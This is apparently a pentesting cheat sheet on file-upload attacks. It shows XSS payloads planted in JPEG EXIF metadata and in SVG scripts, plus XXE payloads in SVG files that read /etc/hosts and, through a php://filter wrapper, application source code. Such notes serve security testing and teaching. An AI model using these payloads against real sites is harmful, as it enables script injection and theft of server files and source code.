# Limited File Uploads

## XSS

### Metadata

```sh
my@attack:~$ exiftool -Comment='"><img src=x onerror=alert(document.domain)>' logo.jpg
my@attack:~$ exiftool logo.jpg
```

```output title="Output" hl_lines="12"
ExifTool Version Number         : 13.25
File Name                       : logo.jpg
Directory                       : .
File Size                       : 8.6 kB
File Modification Date/Time     : 2025:04:28 20:15:37+03:00
File Access Date/Time           : 2025:04:28 20:15:37+03:00
File Inode Change Date/Time     : 2025:04:28 20:15:37+03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : "><img src=x onerror=alert(document.domain)>
Image Width                     : 274
Image Height                    : 184
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 274x184
Megapixels                      : 0.050
```

### SVG

```xml title="logo.svg" linenums="1"
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert(document.domain);</script>
</svg>
```

## XXE

### Reading Sensitive Files

```dtd title="logo.svg" linenums="1"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<svg>&xxe;</svg>
```

### Reading Source Code

```dtd title="logo.svg" linenums="1"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<svg>&xxe;</svg>
```
